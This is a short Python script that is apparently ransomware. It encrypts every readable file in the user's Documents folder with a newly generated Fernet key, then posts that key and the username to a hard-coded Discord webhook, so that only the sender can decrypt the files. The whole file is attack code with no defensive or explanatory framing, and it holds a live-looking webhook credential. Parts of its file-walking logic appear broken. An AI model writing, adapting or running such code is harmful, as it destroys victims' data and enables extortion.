from cryptography.fernet import Fernet
import os
import requests
import subprocess
import json


"""Cipher function"""
def cyp_folder(path, fernet):
    for root, files in os.walk(path):
        for filename in files:
            filepath = os.path.join(root, filename)
            if not os.access(filepath, os.R_OK):
                continue
            if "directory" in str(os.system(f"file {filepath}")):
                cyp_folder(path=filepath, fernet=fernet)
            with open(filepath, "rb") as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(filepath, "wb") as f:
                f.write(encrypted_data)


"""Send the key used for encryption"""
def send_key(username, key, discord_webhook_url):
    message = {
        "username": f"{username}",
        "content": f"Key:{key}"
    }
    message_json = json.dumps(message)
    requests.post(discord_webhook_url, data=message_json, headers={'Content-Type': 'application/json'})


"""Just some variables"""
KEY = Fernet.generate_key()
FERNET = Fernet(KEY)
USERNAME = subprocess.check_output(['whoami']).decode('ascii')
INITIAL_PATH = f"/home/{USERNAME}/Documents/"
WEBHOOK_URL = 'https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ'

cyp_folder(path=INITIAL_PATH, fernet=FERNET)
send_key(username=USERNAME, key=KEY, discord_webhook_url=WEBHOOK_URL)